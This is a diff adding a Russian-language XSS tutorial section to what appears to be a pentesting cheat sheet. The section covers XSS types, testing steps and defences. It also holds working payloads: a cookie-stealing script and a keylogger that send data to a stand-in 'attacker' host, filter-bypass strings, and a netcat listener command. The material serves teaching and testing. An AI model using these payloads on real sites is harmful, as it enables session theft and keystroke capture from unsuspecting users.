@@ -1125,3 +1125,45 @@ html
 <input type="submit">
 </form>
 <script>document.forms[0].submit();</script>
+
+### Введение в XSS (Cross-Site Scripting) (XSS Introduction)
+Определение
+Уязвимость, позволяющая внедрить JavaScript в страницу, который выполняется в браузере жертвы.
+
+Условия
+- Источник: пользовательский ввод (URL, форма, cookie, заголовок).
+- Приёмник: ввод попадает в HTML, JS, атрибут, innerHTML без экранирования.
+
+Типы XSS
+- **Reflected** — ввод сразу отражается в ответе.
+- **Stored** — ввод сохраняется на сервере и выполняется у всех посетителей.
+- **DOM-based** — выполняется на стороне клиента, без участия сервера.
+- **Blind** — полезная нагрузка срабатывает у другого пользователя (админа), результат не виден атакующему.
+
+Базовые payloads
+- `<script>alert('XSS')</script>` — подтверждение.
+- Кража cookie:  
+  `<script>fetch('http://attacker/cookie?='+btoa(document.cookie))</script>`
+- Кейлоггер:  
+  `<script>document.onkeypress=e=>fetch('http://attacker?key='+btoa(e.key))</script>`
+- Вызов функции: `<script>user.changeEmail('attacker@evil.com')</script>`
+
+Обход фильтров
+- Внутри атрибута: `"><script>alert(1)</script>`
+- Внутри textarea: `</textarea><script>alert(1)</script>`
+- Внутри JS-строки: `';alert(1);//`
+- Удаление `script`: `<sscriptcript>alert(1)</sscriptcript>`
+- Фильтр `<` и `>`: `" onload="alert(1)`
+
+Как тестировать
+1. Ищи отражаемый или сохраняемый ввод (поиск, комментарии, профили).
+2. Вставляй тестовые payloads и смотри, выполняется ли alert.
+3. Для Blind XSS используй внешний listener (`nc -lvnp 9001`) и payload с `fetch`.
+4. Проверяй контекст через DevTools (Elements, Console).
+
+Защита
+- Экранирование вывода в зависимости от контекста.
+- `HttpOnly` для cookie.
+- Content Security Policy (CSP).
+- Фильтрация ввода по whitelist.
+- Использование безопасных методов DOM (textContent вместо innerHTML).
